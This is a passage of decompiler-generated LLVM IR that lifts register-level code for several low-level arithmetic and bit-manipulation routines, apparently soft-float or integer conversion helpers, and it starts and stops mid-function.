  %v5_1ee30 = icmp ne i32 %v4_1ee30, 0
  %v6_1ee30 = shl i32 %v0_1ee30, %v1_1ee28
  %v2_1ee34 = or i32 %v6_1ee30, 2
  %v2_1ee34.v6_1ee30 = select i1 %v5_1ee30, i32 %v2_1ee34, i32 %v6_1ee30
  store i32 %v2_1ee34.v6_1ee30, i32* %ip.global-to-local, align 4
  %v0_1ee38 = load i32, i32* @r0, align 4
  %v7_1ee38 = ashr i32 %v0_1ee30, %v1_1ee24
  %v8_1ee38 = add i32 %v0_1ee38, %v7_1ee38
  store i32 %v8_1ee38, i32* %r0.global-to-local, align 4
  %v0_1ee3c = load i32, i32* @r1, align 4
  %v2_1ee3c = and i32 %v0_1ee30, 1073741824
  %v3_1ee3c = icmp ne i32 %v2_1ee3c, 0
  %v4_1ee3c = ashr i32 %v0_1ee30, 31
  %v6_1ee3c = add i32 %v0_1ee3c, %v4_1ee3c
  %v7_1ee3c = zext i1 %v3_1ee3c to i32
  %v8_1ee3c = add i32 %v6_1ee3c, %v7_1ee3c
  br label %dec_label_pc_1ee40

dec_label_pc_1ee40:                               ; preds = %dec_label_pc_1ee0c, %dec_label_pc_1ee24
  %storemerge = phi i32 [ %v11_1ee1c, %dec_label_pc_1ee0c ], [ %v8_1ee3c, %dec_label_pc_1ee24 ]
  %v0_1ee40 = phi i32 [ %v11_1ee1c, %dec_label_pc_1ee0c ], [ %v8_1ee3c, %dec_label_pc_1ee24 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1ee40 = and i32 %v0_1ee40, -2147483648
  store i32 %v1_1ee40, i32* @r5, align 4
  %v1_1ee44 = icmp sgt i32 %v0_1ee40, -1
  call void @__pseudo_cond_branch(i1 %v1_1ee44, i32 ptrtoint (i32* @global_var_1ee54.1721 to i32))
  %v0_1ee48 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ee48 = sub i32 0, %v0_1ee48
  store i32 %v1_1ee48, i32* %ip.global-to-local, align 4
  %v2_1ee48 = icmp eq i32 %v0_1ee48, 0
  %v0_1ee4c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ee4c = icmp eq i1 %v2_1ee48, false
  %v5_1ee4c = sext i1 %v2_1ee4c to i32
  %v6_1ee4c = sub i32 %v5_1ee4c, %v0_1ee4c
  store i32 %v6_1ee4c, i32* %r0.global-to-local, align 4
  %v7_1ee4c = zext i1 %v2_1ee4c to i32
  %v8_1ee4c = icmp ne i32 %v6_1ee4c, %v7_1ee4c
  %v9_1ee4c = icmp ne i32 %v0_1ee4c, -1
  %v10_1ee4c = or i1 %v9_1ee4c, %v8_1ee4c
  %v11_1ee4c = icmp ne i32 %v0_1ee4c, 0
  %v12_1ee4c = select i1 %v2_1ee4c, i1 %v10_1ee4c, i1 %v11_1ee4c
  %v0_1ee50 = load i32, i32* %r1.global-to-local, align 4
  %v5_1ee50 = sext i1 %v12_1ee4c to i32
  %v6_1ee50 = sub i32 %v5_1ee50, %v0_1ee50
  store i32 %v6_1ee50, i32* @r1, align 4
  ret i32 %v6_1ee4c

; uselistorder directives
  uselistorder i1 %v2_1ee4c, { 1, 2, 0 }
  uselistorder i32 %v0_1ee4c, { 1, 2, 0 }
  uselistorder i32 %v8_1ee3c, { 1, 0 }
  uselistorder i32 %v0_1ee30, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1ee1c, { 1, 0 }
  uselistorder i32 %v1_1ee18, { 1, 0, 2 }
  uselistorder i32 %v0_1ee10, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1ee40, { 1, 0 }
}

define i32 @function_1ee54(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1ee54:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1ee54 = load i32, i32* %r1.global-to-local, align 4
  %v3_1ee58 = icmp ult i32 %v0_1ee54, 1048574
  br i1 %v3_1ee58, label %dec_label_pc_1ee9c, label %dec_label_pc_1ee5c

dec_label_pc_1ee5c:                               ; preds = %dec_label_pc_1ee54
  %v3_1ee60 = icmp ult i32 %v0_1ee54, 2097150
  br i1 %v3_1ee60, label %dec_label_pc_1ee80, label %dec_label_pc_1ee64

dec_label_pc_1ee64:                               ; preds = %dec_label_pc_1ee5c
  %v1_1ee64 = urem i32 %v0_1ee54, 2
  %v2_1ee64 = icmp ne i32 %v1_1ee64, 0
  %v3_1ee64 = udiv i32 %v0_1ee54, 2
  store i32 %v3_1ee64, i32* %r1.global-to-local, align 4
  %v0_1ee68 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ee68 = zext i1 %v2_1ee64 to i32
  %v6_1ee68 = zext i32 %v0_1ee68 to i64
  %v7_1ee68 = sub i32 33, %v0_1ee68
  %v8_1ee68 = zext i32 %v7_1ee68 to i64
  %v9_1ee68 = shl i64 %v6_1ee68, %v8_1ee68
  %v10_1ee68 = sub i32 32, %v0_1ee68
  %v11_1ee68 = shl i32 %v3_1ee68, %v10_1ee68
  %v12_1ee68 = zext i32 %v11_1ee68 to i64
  %v14_1ee68 = or i64 %v12_1ee68, %v9_1ee68
  %v15_1ee68 = trunc i64 %v14_1ee68 to i32
  %v16_1ee68 = add i32 %v0_1ee68, -1
  %v17_1ee68 = shl i32 1, %v16_1ee68
  %v18_1ee68 = and i32 %v17_1ee68, %v0_1ee68
  %v19_1ee68 = icmp ne i32 %v18_1ee68, 0
  store i32 %v15_1ee68, i32* %r0.global-to-local, align 4
  %v0_1ee6c = load i32, i32* @ip, align 4
  %v3_1ee6c = zext i1 %v19_1ee68 to i32
  %v6_1ee6c = zext i32 %v0_1ee6c to i64
  %v7_1ee6c = sub i32 33, %v0_1ee6c
  %v8_1ee6c = zext i32 %v7_1ee6c to i64
  %v9_1ee6c = shl i64 %v6_1ee6c, %v8_1ee6c
  %v10_1ee6c = sub i32 32, %v0_1ee6c
  %v11_1ee6c = shl i32 %v3_1ee6c, %v10_1ee6c
  %v12_1ee6c = zext i32 %v11_1ee6c to i64
  %v14_1ee6c = or i64 %v12_1ee6c, %v9_1ee6c
  %v15_1ee6c = trunc i64 %v14_1ee6c to i32
  store i32 %v15_1ee6c, i32* @ip, align 4
  %v0_1ee70 = load i32, i32* @r4, align 4
  %v1_1ee70 = add i32 %v0_1ee70, 1
  store i32 %v1_1ee70, i32* @r4, align 4
  %v3_1ee74 = mul i32 %v1_1ee70, 2097152
  %v2_1ee78 = icmp ugt i32 %v3_1ee74, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1ee78, i32 ptrtoint (i32* @global_var_1f030.1722 to i32))
  br label %dec_label_pc_1ee80

dec_label_pc_1ee80:                               ; preds = %dec_label_pc_1ee9c, %dec_label_pc_1ee5c, %dec_label_pc_1ee64
  %v0_1ee80 = load i32, i32* @ip, align 4
  %v2_1ee80 = icmp slt i32 %v0_1ee80, 0
  %v6_1ee80 = icmp eq i32 %v0_1ee80, -2147483648
  %v1_1ee84 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1ee80, label %bb, label %dec_label_pc_1ee80._crit_edge

bb:                                               ; preds = %dec_label_pc_1ee80
  %v2_1ee84 = urem i32 %v1_1ee84, 2
  %v3_1ee84 = icmp ne i32 %v2_1ee84, 0
  br label %dec_label_pc_1ee80._crit_edge

dec_label_pc_1ee80._crit_edge:                    ; preds = %dec_label_pc_1ee80, %bb
  %v1_1ee88 = phi i1 [ %v3_1ee84, %bb ], [ %v2_1ee80, %dec_label_pc_1ee80 ]
  %v2_1ee88 = zext i1 %v1_1ee88 to i32
  %v3_1ee88 = add i32 %v2_1ee88, %v1_1ee84
  store i32 %v3_1ee88, i32* %r0.global-to-local, align 4
  %v0_1ee8c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ee8c = load i32, i32* @r4, align 4
  %v2_1ee8c = and i32 %v1_1ee8c, 4096
  %v3_1ee8c = icmp ne i32 %v2_1ee8c, 0
  %v4_1ee8c = mul i32 %v1_1ee8c, 1048576
  %v6_1ee8c = add i32 %v4_1ee8c, %v0_1ee8c
  %v7_1ee8c = zext i1 %v3_1ee8c to i32
  %v8_1ee8c = add i32 %v7_1ee8c, %v6_1ee8c
  %v1_1ee90 = load i32, i32* @r5, align 4
  %v2_1ee90 = or i32 %v1_1ee90, %v8_1ee8c
  store i32 %v2_1ee90, i32* %r1.global-to-local, align 4
  ret i32 %v3_1ee88

dec_label_pc_1ee9c:                               ; preds = %dec_label_pc_1ee54
  %v0_1ee9c = load i32, i32* @ip, align 4
  %v1_1ee9c = icmp slt i32 %v0_1ee9c, 0
  %v2_1ee9c = mul i32 %v0_1ee9c, 2
  store i32 %v2_1ee9c, i32* @ip, align 4
  %v0_1eea0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1eea0 = mul i32 %v0_1eea0, 2
  %v4_1eea0 = zext i1 %v1_1ee9c to i32
  %v5_1eea0 = or i32 %v3_1eea0, %v4_1eea0
  store i32 %v5_1eea0, i32* %r0.global-to-local, align 4
  %v9_1eea0 = icmp ule i32 %v5_1eea0, %v0_1eea0
  %v10_1eea0 = icmp ult i32 %v3_1eea0, %v0_1eea0
  %v11_1eea0 = select i1 %v1_1ee9c, i1 %v9_1eea0, i1 %v10_1eea0
  %v3_1eea4 = mul i32 %v0_1ee54, 2
  %v4_1eea4 = zext i1 %v11_1eea0 to i32
  %v5_1eea4 = or i32 %v4_1eea4, %v3_1eea4
  store i32 %v5_1eea4, i32* %r1.global-to-local, align 4
  %v1_1eea8 = and i32 %v3_1eea4, 1048576
  %v2_1eea8 = icmp eq i32 %v1_1eea8, 0
  %v0_1eeac = load i32, i32* @r4, align 4
  %v1_1eeac = add i32 %v0_1eeac, -1
  store i32 %v1_1eeac, i32* @r4, align 4
  br i1 %v2_1eea8, label %bb7, label %dec_label_pc_1ee80

bb7:                                              ; preds = %dec_label_pc_1ee9c
  ret i32 %v5_1eea0

; uselistorder directives
  uselistorder i32 %v0_1eea0, { 1, 2, 0 }
  uselistorder i1 %v1_1ee9c, { 1, 0 }
  uselistorder i32 %v1_1ee84, { 1, 0 }
  uselistorder i32 %v0_1ee80, { 1, 0 }
  uselistorder i32 %v0_1ee6c, { 1, 0, 2 }
  uselistorder i32 %v0_1ee68, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1ee80._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1ee80, { 0, 2, 1 }
}

define i32 @function_1eeb4() local_unnamed_addr {
dec_label_pc_1eeb4:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1eeb4 = load i32, i32* @r1, align 4
  %v2_1eeb4 = icmp eq i32 %v0_1eeb4, 0
  br i1 %v2_1eeb4, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1eeb4
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1eeb4
  %v1_1eec010 = load i32, i32* @r0, align 4
  store i32 %v1_1eec010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1ef1c = phi i32 [ %v0_1eeb4, %bb ], [ %v1_1eec010, %bb38 ]
  %v1_1eed4 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1eecc = icmp ugt i32 %v0_1ef1c, 65535
  br i1 %v2_1eecc, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1eed0 = and i32 %v0_1ef1c, 32768
  %v3_1eed0 = icmp eq i32 %v2_1eed0, 0
  %v4_1eed0 = udiv i32 %v0_1ef1c, 65536
  br i1 %v3_1eed0, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1eed4 = add nsw i32 %v1_1eed4, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1eee0 = phi i32 [ %v1_1eed4, %.thread ], [ %v1_1eed4, %bb39 ], [ %v2_1eed4, %bb40 ]
  %v1_1eedc = phi i32 [ %v0_1ef1c, %.thread ], [ %v4_1eed0, %bb39 ], [ %v4_1eed0, %bb40 ]
  %v2_1eed8 = icmp ugt i32 %v1_1eedc, 255
  br i1 %v2_1eed8, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1eedc = and i32 %v1_1eedc, 128
  %v3_1eedc = icmp eq i32 %v2_1eedc, 0
  %v4_1eedc = udiv i32 %v1_1eedc, 256
  br i1 %v3_1eedc, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1eee0 = add nsw i32 %v1_1eee0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1eeec = phi i32 [ %v1_1eee0, %.thread3 ], [ %v1_1eee0, %bb41 ], [ %v2_1eee0, %bb42 ]
  %v1_1eee8 = phi i32 [ %v1_1eedc, %.thread3 ], [ %v4_1eedc, %bb41 ], [ %v4_1eedc, %bb42 ]
  %v2_1eee4 = icmp ugt i32 %v1_1eee8, 15
  br i1 %v2_1eee4, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1eee8 = and i32 %v1_1eee8, 8
  %v3_1eee8 = icmp eq i32 %v2_1eee8, 0
  %v4_1eee8 = udiv i32 %v1_1eee8, 16
  br i1 %v3_1eee8, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1eeec = add nsw i32 %v1_1eeec, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1eef4 = phi i32 [ %v1_1eeec, %.thread4 ], [ %v1_1eeec, %bb43 ], [ %v2_1eeec, %bb44 ]
  %v1_1eefc = phi i32 [ %v1_1eee8, %.thread4 ], [ %v4_1eee8, %bb43 ], [ %v4_1eee8, %bb44 ]
  %v2_1eef0 = icmp ugt i32 %v1_1eefc, 3
  br i1 %v2_1eef0, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1eef4 = add i32 %v1_1eef4, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1eef8 = udiv i32 %v1_1eefc, 2
  %v6_1eef8 = sub i32 %v1_1eef4, %v5_1eef8
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1eefc = phi i32 [ %v6_1eef8, %.thread6 ], [ %v2_1eef4, %bb45 ]
  %v4_1eefc = udiv i32 %v1_1eefc, 8
  %v5_1eefc = sub i32 %v0_1eefc, %v4_1eefc
  %v2_1ef00 = add i32 %v5_1eefc, -32
  %v4_1ef00 = sub i32 31, %v5_1eefc
  %v5_1ef00 = and i32 %v4_1ef00, %v5_1eefc
  %v8_1ef00 = icmp eq i32 %v5_1eefc, 32
  %v6_1ef04 = icmp slt i32 %v5_1eefc, 32
  br i1 %v6_1ef04, label %dec_label_pc_1ef08, label %dec_label_pc_1ef28

dec_label_pc_1ef08:                               ; preds = %bb46
  %v2_1ef08 = add i32 %v5_1eefc, -20
  %v7_1ef0c = icmp sgt i32 %v2_1ef00, -12
  br i1 %v7_1ef0c, label %dec_label_pc_1ef10, label %dec_label_pc_1ef24

dec_label_pc_1ef10:                               ; preds = %dec_label_pc_1ef08
  %v1_1ef14 = sub i32 32, %v5_1eefc
  %v6_1ef18 = shl i32 %v0_1ef1c, %v5_1eefc
  store i32 %v6_1ef18, i32* @r0, align 4
  %v6_1ef1c = lshr i32 %v0_1ef1c, %v1_1ef14
  store i32 %v6_1ef1c, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1ef24:                               ; preds = %dec_label_pc_1ef08
  %v8_1ef08 = icmp eq i32 %v2_1ef08, 0
  %v4_1ef08 = add i32 %v5_1eefc, 2147483616
  %v5_1ef08 = and i32 %v2_1ef08, %v4_1ef08
  br label %dec_label_pc_1ef28

dec_label_pc_1ef28:                               ; preds = %bb46, %dec_label_pc_1ef24
  %v1_1ef34.in = phi i32 [ %v2_1ef00, %bb46 ], [ %v2_1ef08, %dec_label_pc_1ef24 ]
  %v6_1ef34 = phi i32 [ %v2_1ef00, %bb46 ], [ %v5_1eefc, %dec_label_pc_1ef24 ]
  %v2_1ef34.in = phi i32 [ %v5_1ef00, %bb46 ], [ %v5_1ef08, %dec_label_pc_1ef24 ]
  %v0_1ef34 = phi i1 [ %v8_1ef00, %bb46 ], [ %v8_1ef08, %dec_label_pc_1ef24 ]
  %v1_1ef34 = icmp slt i32 %v1_1ef34.in, 0
  %v2_1ef34 = icmp slt i32 %v2_1ef34.in, 0
  %v3_1ef28 = xor i1 %v2_1ef34, %v1_1ef34
  %v4_1ef28 = or i1 %v0_1ef34, %v3_1ef28
  br i1 %v4_1ef28, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1ef28
  %v6_1ef28 = sub i32 32, %v6_1ef34
  store i32 %v6_1ef28, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1ef28, %bb47
  %v6_1ef2c = shl i32 %v0_1ef1c, %v6_1ef34
  store i32 %v6_1ef2c, i32* %r1.global-to-local, align 4
  br i1 %v4_1ef28, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1ef30 = load i32, i32* @r0, align 4
  %v7_1ef30 = load i32, i32* @ip, align 4
  %v12_1ef30 = lshr i32 %v6_1ef30, %v7_1ef30
  %v13_1ef30 = or i32 %v12_1ef30, %v6_1ef2c
  store i32 %v13_1ef30, i32* %r1.global-to-local, align 4
  %v11_1ef34 = shl i32 %v6_1ef30, %v6_1ef34
  store i32 %v11_1ef34, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1ef10, %bb49
  %v6_1ef3c = phi i32 [ %v6_1ef1c, %dec_label_pc_1ef10 ], [ %v13_1ef30, %bb49 ], [ %v6_1ef2c, %bb48 ]
  %v0_1ef38 = load i32, i32* @r4, align 4
  %v2_1ef38 = sub i32 %v0_1ef38, %v5_1eefc
  store i32 %v2_1ef38, i32* %r4.global-to-local, align 4
  %v4_1ef38 = xor i32 %v0_1ef38, %v5_1eefc
  %v5_1ef38 = xor i32 %v2_1ef38, %v0_1ef38
  %v6_1ef38 = and i32 %v5_1ef38, %v4_1ef38
  %v7_1ef38 = icmp slt i32 %v6_1ef38, 0
  %v8_1ef38 = icmp slt i32 %v2_1ef38, 0
  %v5_1ef3c = icmp slt i32 %v0_1ef38, %v5_1eefc
  br i1 %v5_1ef3c, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1ef3c = mul i32 %v2_1ef38, 1048576
  %v11_1ef3c = add i32 %v10_1ef3c, %v6_1ef3c
  %v7_1ef40 = load i32, i32* @r5, align 4
  %v8_1ef40 = or i32 %v7_1ef40, %v11_1ef3c
  store i32 %v8_1ef40, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1ef48 = xor i1 %v8_1ef38, %v7_1ef38
  %v4_1ef48 = xor i1 %v3_1ef48, true
  call void @__pseudo_cond_branch(i1 %v4_1ef48, i32 %tmp33)
  %v0_1ef4c = load i32, i32* %r4.global-to-local, align 4
  %v2_1ef50 = sub i32 -32, %v0_1ef4c
  store i32 %v2_1ef50, i32* %r4.global-to-local, align 4
  %v6_1ef54 = icmp sgt i32 %v0_1ef4c, -32
  br i1 %v6_1ef54, label %dec_label_pc_1ef58, label %dec_label_pc_1ef98

dec_label_pc_1ef58:                               ; preds = %.thread8
  %v1_1ef58 = add i32 %v2_1ef50, 12
  store i32 %v1_1ef58, i32* %r4.global-to-local, align 4
  %v8_1ef5c = icmp sgt i32 %v1_1ef58, 0
  br i1 %v8_1ef5c, label %dec_label_pc_1ef7c, label %dec_label_pc_1ef60

dec_label_pc_1ef60:                               ; preds = %dec_label_pc_1ef58
  %v1_1ef60 = add i32 %v2_1ef50, 32
  %v1_1ef64 = sub i32 0, %v2_1ef50
  %v0_1ef68 = load i32, i32* @r0, align 4
  %v6_1ef68 = lshr i32 %v0_1ef68, %v1_1ef60
  %v1_1ef6c = load i32, i32* %r1.global-to-local, align 4
  %v7_1ef6c = shl i32 %v1_1ef6c, %v1_1ef64
  %v8_1ef6c = or i32 %v7_1ef6c, %v6_1ef68
  %v0_1ef70 = load i32, i32* @r5, align 4
  %v7_1ef70 = lshr i32 %v1_1ef6c, %v1_1ef60
  %v8_1ef70 = or i32 %v0_1ef70, %v7_1ef70
  store i32 %v8_1ef70, i32* %r1.global-to-local, align 4
  %v2_1ef74 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1ef74, i32* %r4.global-to-local, align 4
  ret i32 %v8_1ef6c

dec_label_pc_1ef7c:                               ; preds = %dec_label_pc_1ef58
  %v1_1ef7c = sub i32 0, %v2_1ef50
  %v1_1ef80 = add i32 %v2_1ef50, 32
  %v0_1ef84 = load i32, i32* @r0, align 4
  %v6_1ef84 = lshr i32 %v0_1ef84, %v1_1ef80
  %v1_1ef88 = load i32, i32* %r1.global-to-local, align 4
  %v7_1ef88 = shl i32 %v1_1ef88, %v1_1ef7c
  %v8_1ef88 = or i32 %v7_1ef88, %v6_1ef84
  %v0_1ef8c = load i32, i32* @r5, align 4
  store i32 %v0_1ef8c, i32* %r1.global-to-local, align 4
  %v2_1ef90 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1ef90, i32* %r4.global-to-local, align 4
  ret i32 %v8_1ef88

dec_label_pc_1ef98:                               ; preds = %.thread8
  %v0_1ef98 = load i32, i32* %r1.global-to-local, align 4
  %v6_1ef98 = lshr i32 %v0_1ef98, %v2_1ef50
  %v0_1ef9c = load i32, i32* @r5, align 4
  store i32 %v0_1ef9c, i32* %r1.global-to-local, align 4
  %v2_1efa0 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1efa0, i32* %r4.global-to-local, align 4
  ret i32 %v6_1ef98

; uselistorder directives
  uselistorder i32 %v2_1ef50, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1ef38, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1ef38, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1ef2c, { 1, 0, 2 }
  uselistorder i32 %v2_1ef00, { 1, 0, 2 }
  uselistorder i32 %v5_1eefc, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1eee8, { 1, 0 }
  uselistorder i32 %v1_1eee8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1eedc, { 1, 0 }
  uselistorder i32 %v1_1eedc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1eed0, { 1, 0 }
  uselistorder i32 %v0_1ef1c, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 13, 14, 5, 16, 17, 6, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 23, 7, 24, 25, 26, 0 }
  uselistorder i32 -20, { 1, 4, 2, 0, 3 }
  uselistorder i32 -2, { 9, 10, 11, 19, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 22, 23, 24, 17, 16, 20, 18, 1 }
  uselistorder i32 -4, { 10, 2, 11, 50, 51, 52, 53, 54, 55, 0, 1, 49, 12, 56, 13, 21, 73, 74, 75, 6, 22, 23, 24, 76, 77, 78, 7, 25, 26, 27, 79, 80, 81, 8, 28, 29, 82, 20, 19, 83, 84, 85, 18, 17, 16, 15, 30, 31, 32, 33, 34, 5, 35, 3, 36, 4, 86, 14, 37, 45, 46, 47, 48, 38, 39, 61, 62, 63, 9, 64, 65, 66, 40, 60, 67, 68, 69, 70, 71, 72, 41, 57, 58, 59, 42, 43, 44 }
  uselistorder i32 15, { 9, 10, 3, 16, 0, 18, 11, 12, 13, 14, 1, 20, 19, 2, 15, 4, 5, 6, 7, 8, 17 }
  uselistorder i32 -8, { 13, 14, 1, 42, 15, 16, 17, 43, 24, 25, 26, 27, 28, 29, 23, 22, 12, 21, 20, 19, 18, 30, 31, 32, 33, 34, 46, 47, 35, 36, 48, 37, 49, 41, 38, 39, 40, 2, 44, 45, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 128, { 14, 15, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 22, 23, 3, 4, 12, 24, 5, 17, 13, 25, 16, 18, 19 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 76, 75, 74, 77, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 48, 49, 50, 51, 52, 54, 53, 55, 58, 57, 56, 59, 60, 61, 64, 63, 62, 65, 67, 68, 66, 69, 71, 72, 70, 73 }
  uselistorder i32 32768, { 3, 4, 1, 6, 2, 0, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 31, 5, 27, 21, 22, 6, 2, 7, 9, 8, 10, 3, 11, 29, 25, 12, 13, 30, 28, 26, 33, 34, 4, 35, 0, 36, 37, 14, 15, 32, 16, 18, 23, 17, 19, 24, 20 }
  uselistorder i32 20, { 7, 67, 68, 4, 12, 9, 8, 15, 73, 2, 76, 16, 69, 70, 46, 47, 48, 49, 71, 72, 17, 66, 18, 83, 14, 84, 85, 5, 86, 74, 19, 1, 0, 10, 20, 21, 22, 23, 24, 77, 78, 25, 26, 75, 27, 28, 63, 64, 65, 50, 29, 30, 51, 52, 3, 31, 32, 87, 33, 34, 35, 36, 37, 88, 38, 40, 41, 39, 42, 6, 11, 79, 80, 81, 82, 43, 53, 54, 55, 56, 57, 58, 59, 60, 13, 44, 61, 45, 62 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1ef28, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1efa8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1efa8:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1efa8 = load i32, i32* @r4, align 4
  %v2_1efa8 = icmp eq i32 %v0_1efa8, 0
  %v1_1efac = xor i32 %arg3, 1048576
  store i32 %v1_1efac, i32* @r3, align 4
  br i1 %v2_1efa8, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1efa8
  %v1_1efb0 = load i32, i32* @r1, align 4
  %v2_1efb0 = xor i32 %v1_1efb0, 1048576
  store i32 %v2_1efb0, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1efa8
  %v1_1efb8 = load i32, i32* @r5, align 4
  %v2_1efb8 = add i32 %v1_1efb8, -1
  store i32 %v2_1efb8, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1efbc = call i32 @function_1ee00()
  store i32 %v0_1efbc, i32* %r0.global-to-local, align 4
  %v0_1efc0 = load i32, i32* @r4, align 4
  %v0_1efc0.off = add i32 %v0_1efc0, 4194303
  %tmp = icmp ult i32 %v0_1efc0.off, 2097152
  %v1_1f050 = load i32, i32* @r5, align 4
  %v1_1f050.off = add i32 %v1_1f050, 4194303
  %tmp44 = icmp ult i32 %v1_1f050.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1efcc

dec_label_pc_1efcc:                               ; preds = %bb30
  %v4_1efcc = icmp eq i32 %v1_1f050, %v0_1efc0
  br i1 %v4_1efcc, label %bb31, label %dec_label_pc_1efd8

bb31:                                             ; preds = %dec_label_pc_1efcc
  %v2_1efd0 = load i32, i32* @r2, align 4
  %v5_1efd0 = icmp eq i32 %v2_1efd0, %v0_1efbc
  br i1 %v5_1efd0, label %dec_label_pc_1efec, label %dec_label_pc_1efd8

dec_label_pc_1efd8:                               ; preds = %dec_label_pc_1efcc, %bb31
  %v2_1efd8 = or i32 %v0_1efc0, %v0_1efbc
  %v4_1efd8 = icmp eq i32 %v2_1efd8, 0
  br i1 %v4_1efd8, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1efd8
  %v1_1efe0 = load i32, i32* @r2, align 4
  store i32 %v1_1efe0, i32* %r0.global-to-local, align 4
  br label %.thread6

